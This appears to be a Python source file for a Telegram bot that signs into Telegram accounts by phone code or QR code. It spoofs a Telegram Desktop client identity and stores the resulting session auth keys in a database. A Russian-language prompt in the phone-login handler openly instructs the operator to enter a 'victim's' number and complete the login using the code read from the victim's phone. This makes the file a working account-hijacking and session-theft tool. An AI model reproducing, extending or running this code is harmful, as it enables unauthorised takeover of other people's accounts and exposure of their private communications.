import asyncio
import io
import logging

import qrcode
from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.types import BufferedInputFile, CallbackQuery, Message
from opentele.api import API
from telethon.custom import QRLogin
from telethon.errors import SessionPasswordNeededError
from telethon.tl.types.auth import (
    SentCodeTypeApp,
    SentCodeTypeCall,
    SentCodeTypeFlashCall,
    SentCodeTypeSms,
)
from telethon.types import User

from bot import keyboards as kb
from bot.core.db.repo import Repo
from bot.core.session.client import Client, ClientManager
from bot.core.session.enums import SessionSource
from bot.core.session.session import SessionManager
from bot.misc.states import LoginStates

from .menu import text_session

logger = logging.getLogger(__name__)

router = Router()


@router.message(F.text == "🆕 Войти")
async def login_handler(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "Выбери тип авторизации\n(Скоро будет доступен вход по QR)",
        reply_markup=kb.sessions.auth_type(),
    )


@router.callback_query(F.data == "login_qr")
async def login_qr_handler(
    query: CallbackQuery,
    client_manager: ClientManager,
    state: FSMContext,
    repo: Repo,
):
    try:
        await client_manager.terminate(query.from_user.id)
    except KeyError:
        pass

    api = API.TelegramDesktop.Generate(system="windows")
    client = client_manager.new(
        api_id=api.api_id,
        api_hash=api.api_hash,
        app_version=api.app_version,
        device_model=api.device_model,
        system_version=api.system_version,
        lang_code=api.lang_code,
        system_lang_code=api.system_lang_code,
        name=query.from_user.id,
        client_timeout=600,
    )

    await client.connect()

    qr_login = await client.qr_login()
    stream = io.BytesIO()
    qr = qrcode.QRCode(version=1, border=1)
    qr.add_data(qr_login.url)
    qr.make_image(fill_color="black", back_color="white").save(stream)
    qr_msg = await query.message.answer_photo(
        photo=BufferedInputFile(file=stream.getvalue(), filename="qr.png")
    )
    await query.message.delete()
    asyncio.create_task(
        wait_for_qr_login(query, state, repo, client_manager, client, qr_login, qr_msg)
    )


async def wait_for_qr_login(
    query: CallbackQuery,
    state: FSMContext,
    repo: Repo,
    client_manager: ClientManager,
    client: Client,
    qr_login: QRLogin,
    qr_msg: Message,
):
    try:
        signed_in = await qr_login.wait()
    except SessionPasswordNeededError:
        await qr_msg.delete()
        await state.set_state(LoginStates.password)
        await query.message.answer(
            "🔑 Двухэтапная проверка включена, и требуется ввести пароль:",
            reply_markup=kb.main_menu.close(),
        )
    else:
        await qr_msg.delete()
        await show_authorized_session(
            query.message, state, repo, client_manager, client, signed_in
        )


@router.callback_query(F.data == "login_phone")
async def login_phone_handler(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(LoginStates.phone_number)
    await query.message.edit_text(
        "Если ты хочешь зайти в чужой телеграм, введи номер жертвы\n\n"
        "Затем когда будет доступ к ее телефону или телеграму, посмотри код и заверши вход\n\n"
        "☎️ Введи номер телефона:"
    )


@router.message(LoginStates.phone_number)
async def phone_number_handler(message: Message, state: FSMContext):
    phone_number = "".join(x for x in message.text if x.isdigit())
    await state.update_data(phone_number=phone_number)
    await message.answer(
        f"Телефон <code>{phone_number}</code> коректен?",
        reply_markup=kb.sessions.phone_confirm(),
    )
    await state.set_state(LoginStates.phone_confirm)


@router.callback_query(F.data == "phone_cancel", LoginStates.phone_confirm)
async def phone_cancel_handler(query: CallbackQuery, state: FSMContext):
    await state.clear()
    await query.message.edit_text("❌ Отменено")


@router.callback_query(F.data == "phone_confirm", LoginStates.phone_confirm)
async def phone_confirm_handler(
    query: CallbackQuery, state: FSMContext, client_manager: ClientManager
):
    try:
        await client_manager.terminate(query.from_user.id)
    except KeyError:
        pass

    data = await state.get_data()
    api = API.TelegramDesktop.Generate(system="windows")
    client = client_manager.new(
        api_id=api.api_id,
        api_hash=api.api_hash,
        app_version=api.app_version,
        device_model=api.device_model,
        system_version=api.system_version,
        lang_code=api.lang_code,
        system_lang_code=api.system_lang_code,
        name=query.from_user.id,
        client_timeout=600,
    )

    await client.connect()

    sent_code = await client.send_code(data["phone_number"])

    sent_code_descriptions = None

    if isinstance(sent_code.type, SentCodeTypeApp):
        sent_code_descriptions = "Telegram app"

    if isinstance(sent_code.type, SentCodeTypeSms):
        sent_code_descriptions = "SMS"

    if isinstance(sent_code.type, SentCodeTypeCall):
        sent_code_descriptions = "Phone call"

    if isinstance(sent_code.type, SentCodeTypeFlashCall):
        sent_code_descriptions = "Phone flash call"

    text = "Код подтверждения отправлен\n🔑 Введите код:"

    if sent_code_descriptions:
        text = (
            f"Код подтверждения отправлен через {sent_code_descriptions}\n"
            "🔑 Введите код:"
        )

    await state.set_state(LoginStates.phone_code)
    await query.message.edit_text(
        text,
        reply_markup=kb.main_menu.close(),
    )


@router.message(F.text, LoginStates.phone_code)
async def phone_code_handler(
    message: Message, state: FSMContext, repo: Repo, client_manager: ClientManager
):
    client = client_manager.get(message.from_user.id)

    try:
        signed_in = await client.sign_in(message.text)

    except SessionPasswordNeededError:
        await state.set_state(LoginStates.password)
        await message.answer(
            "🔑 Двухэтапная проверка включена, и требуется ввести пароль:",
            reply_markup=kb.main_menu.close(),
        )

    else:
        await show_authorized_session(
            message, state, repo, client_manager, client, signed_in
        )


@router.message(LoginStates.password)
async def upload_session_handler(
    message: Message, state: FSMContext, repo: Repo, client_manager: ClientManager
):
    client = client_manager.get(message.from_user.id)
    signed_in = await client.sign_in(password=message.text)
    await show_authorized_session(
        message, state, repo, client_manager, client, signed_in
    )


async def show_authorized_session(
    message: Message,
    state: FSMContext,
    repo: Repo,
    client_manager: ClientManager,
    client: Client,
    signed_in: User,
):
    await state.clear()
    manager = SessionManager(
        dc_id=client.session.dc_id,
        auth_key=client.session.auth_key.key,
        user_id=signed_in.id,
        valid=True,
        first_name=signed_in.first_name,
        last_name=signed_in.last_name,
        username=signed_in.username,
        phone=signed_in.phone,
        source=SessionSource.LOGIN_PHONE,
    )
    session = await repo.session.add_from_manager(message.from_user.id, manager)

    await message.answer(
        text_session(manager), reply_markup=kb.sessions.action(session.id)
    )
    await client_manager.terminate(message.from_user.id)
